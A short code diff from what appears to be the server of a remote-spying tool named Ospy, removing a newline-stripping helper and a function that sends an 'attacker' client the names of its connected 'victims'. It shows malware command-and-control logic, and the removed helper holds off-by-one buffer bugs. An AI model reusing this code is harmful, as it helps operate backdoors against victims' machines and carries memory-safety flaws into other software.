@@ -1,35 +1,6 @@
 #include "entering_to_Ospy.h"
 #include "connection.h"
 
-void remove_new_lines(char (* input)[]){
-	char * new_line_less_str = (char *) malloc(strlen(*input));
-	int counter = 0;
-	for (int i = 0; i < strlen(*input); i++) {
-		if((*input)[i] != '\n'){
-			new_line_less_str[counter++] = (*input)[i];
-		}
-	}
-	new_line_less_str[++counter] = '\0';
-	strcpy(*input, new_line_less_str);
-}
-
-
-void send_to_attacker_connected_victims (client attacker){
-	int num_of_connected_victims = 0;
-	char connected_victims[MAX_VICTIMS_PER_ATTACKER][MAX_INPUT_LEN];
-	
-	for (int i = 0;  i < MAX_VICTIMS_PER_ATTACKER; i++){
-		memset(connected_victims[i], '\0', MAX_INPUT_LEN);
-	}
-	for (int curr_client_index = 0; curr_client_index < MAX_CLIENTS && num_of_connected_victims < MAX_VICTIMS_PER_ATTACKER; curr_client_index++) {
-		if (strcmp(clients_list[curr_client_index].id, md5((unsigned char *) attacker.id, strlen(attacker.id))) == 0 && clients_list[curr_client_index].i_am == VICTIM){
-			strtok(clients_list[curr_client_index].name, "\n"); // if exist,remove the '\n'
-			strcpy(connected_victims[num_of_connected_victims++], clients_list[curr_client_index].name);
-		}
-	}
-	send(attacker.socket_fd, &connected_victims, sizeof(connected_victims), 0);
-}
-
 int main (){
 	FILE * events_log = fopen("events_log.log", "a");
 	if (events_log == NULL){
